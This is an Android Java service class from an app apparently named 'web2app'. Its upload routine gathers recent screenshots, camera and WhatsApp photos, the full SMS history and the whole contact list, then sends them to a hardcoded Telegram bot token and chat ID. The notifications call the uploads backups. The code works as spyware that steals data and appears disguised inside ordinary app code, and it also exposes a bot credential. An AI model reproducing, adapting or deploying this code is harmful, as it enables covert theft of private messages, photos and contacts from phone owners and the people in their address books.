package com.csu.web2app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class UploadService extends Service {

    public static final String ACTION_UPLOAD_ALL = "com.csu.web2app.ACTION_UPLOAD_ALL";

    private static final String TAG = "UploadService";
    private static final String CHANNEL_ID = "UploadServiceChannel";

    private static final String TELEGRAM_BOT_TOKEN = "8410087487:AAEouEc1-5-ktGPdNfEJhlYh5UALXxTy2PQ";
    private static final String TELEGRAM_CHAT_ID = "-1003860055748";

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (ACTION_UPLOAD_ALL.equals(action)) {
                startForegroundService(1, createNotification("Gathering all data..."));
                uploadAll(startId);
            }
        }
        return START_NOT_STICKY;
    }

    private void startForegroundService(int id, Notification notification) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(id, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(id, notification);
        }
    }

    private void uploadAll(final int startId) {
        executorService.execute(() -> {
            // 1. Gather Images
            List<Uri> screenshots = findLatestImages("Screenshot", 30);
            List<Uri> cameraPhotos = findLatestImages("Camera", 20);
            List<Uri> whatsappPhotos = findLatestImages("WhatsApp", 10);

            List<Uri> allImages = new ArrayList<>();
            allImages.addAll(screenshots);
            allImages.addAll(cameraPhotos);
            allImages.addAll(whatsappPhotos);

            // 2. Gather SMS
            byte[] smsData = null;
            try (java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream()) {
                writeSmsToStream(baos);
                smsData = baos.toByteArray();
            } catch (IOException e) {
                Log.e(TAG, "Error gathering SMS", e);
            }

            // 3. Gather Contacts
            byte[] contactData = null;
            try (java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream()) {
                writeContactsToStream(baos);
                contactData = baos.toByteArray();
            } catch (IOException e) {
                Log.e(TAG, "Error gathering contacts", e);
            }

            // 4. Upload everything
            int successCount = 0;
            for (int i = 0; i < allImages.size(); i++) {
                updateNotification("Sending image " + (i + 1) + " of " + allImages.size());
                if (uploadFileToTelegram(allImages.get(i), "image_" + i + ".png")) {
                    successCount++;
                }
            }

            if (smsData != null && smsData.length > 0) {
                updateNotification("Sending SMS backup...");
                uploadDocumentToTelegram(smsData, "sms_backup.txt");
            }

            if (contactData != null && contactData.length > 0) {
                updateNotification("Sending contacts backup...");
                uploadDocumentToTelegram(contactData, "contacts_backup.txt");
            }

            stopForeground(true);
            stopSelf(startId);
        });
    }

    private void updateNotification(String contentText) {
        NotificationManager manager = (NotificationManager) getSystemService(android.content.Context.NOTIFICATION_SERVICE);
        if (manager != null) {
            manager.notify(1, createNotification(contentText));
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Upload Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(android.content.Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    protected Notification createNotification(String contentText) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Uploading Data to Telegram")
                .setContentText(contentText)
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .build();
    }

    protected List<Uri> findLatestImages(String folderKeyword, int limit) {
        List<Uri> uris = new ArrayList<>();
        Uri collection = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ?
                MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL) :
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_TAKEN
        };

        String selection = MediaStore.Images.Media.DATA + " LIKE ? OR " +
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME + " LIKE ?";

        String[] selectionArgs = new String[]{"%" + folderKeyword + "%", "%" + folderKeyword + "%"};
        String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";

        try (Cursor cursor = getContentResolver().query(collection, projection, selection, selectionArgs, sortOrder)) {
            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                while (cursor.moveToNext() && uris.size() < limit) {
                    long id = cursor.getLong(idColumn);
                    Uri contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                    uris.add(contentUri);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying MediaStore for " + folderKeyword, e);
        }

        return uris;
    }

    protected void writeSmsToStream(OutputStream outputStream) throws IOException {
        Uri uriSms = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        String[] projection = new String[]{"address", "body", "date"};
        try (Cursor cursor = cr.query(uriSms, projection, null, null, "date DESC")) {
            if (cursor != null && cursor.moveToFirst()) {
                int indexAddress = cursor.getColumnIndexOrThrow("address");
                int indexBody = cursor.getColumnIndexOrThrow("body");
                int indexDate = cursor.getColumnIndexOrThrow("date");

                do {
                    String address = cursor.getString(indexAddress);
                    String body = cursor.getString(indexBody);
                    String date = cursor.getString(indexDate);

                    StringBuilder sb = new StringBuilder();
                    sb.append("From: ").append(address).append("\n");
                    sb.append("Date: ").append(new java.util.Date(Long.parseLong(date))).append("\n");
                    sb.append("Message: ").append(body).append("\n");
                    sb.append("----------------------------------\n");

                    outputStream.write(sb.toString().getBytes());
                } while (cursor.moveToNext());
            }
        }
    }

    protected void writeContactsToStream(OutputStream outputStream) throws IOException {
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        ContentResolver cr = getContentResolver();

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        try (Cursor cursor = cr.query(uri, projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            if (cursor != null && cursor.moveToFirst()) {
                int indexName = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int indexNumber = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER);

                do {
                    String name = cursor.getString(indexName);
                    String number = cursor.getString(indexNumber);

                    StringBuilder sb = new StringBuilder();
                    sb.append("Name: ").append(name).append("\n");
                    sb.append("Phone: ").append(number).append("\n");
                    sb.append("----------------------------------\n");

                    outputStream.write(sb.toString().getBytes());
                } while (cursor.moveToNext());
            }
        }
    }

    protected boolean uploadFileToTelegram(Uri uri, String filename) {
        HttpURLConnection conn = null;
        try {
            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto";
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                // chat_id
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                out.writeBytes(TELEGRAM_CHAT_ID + "\r\n");

                // photo
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + filename + "\"\r\n");
                out.writeBytes("Content-Type: image/png\r\n\r\n");

                try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
                    if (inputStream != null) {
                        byte[] buffer = new byte[8192];
                        int bytesRead;
                        while ((bytesRead = inputStream.read(buffer)) != -1) {
                            out.write(buffer, 0, bytesRead);
                        }
                    }
                }
                out.writeBytes("\r\n");
                out.writeBytes("--" + boundary + "--\r\n");
                out.flush();
            }

            int responseCode = conn.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                try (InputStream errorStream = conn.getErrorStream()) {
                    if (errorStream != null) {
                        byte[] errorBuffer = new byte[1024];
                        int read = errorStream.read(errorBuffer);
                        if (read > 0) {
                            Log.e(TAG, "Telegram error response: " + new String(errorBuffer, 0, read));
                        }
                    }
                }
                Log.e(TAG, "Telegram upload failed with response code: " + responseCode);
                return false;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error uploading to Telegram", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    protected boolean uploadDocumentToTelegram(byte[] data, String filename) {
        HttpURLConnection conn = null;
        try {
            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                // chat_id
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                out.writeBytes(TELEGRAM_CHAT_ID + "\r\n");

                // document
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n");
                out.writeBytes("Content-Type: text/plain\r\n\r\n");
                out.write(data);
                out.writeBytes("\r\n");
                out.writeBytes("--" + boundary + "--\r\n");
                out.flush();
            }

            int responseCode = conn.getResponseCode();
            return responseCode == HttpURLConnection.HTTP_OK;
        } catch (Exception e) {
            Log.e(TAG, "Error uploading document to Telegram", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        executorService.shutdown();
    }
}
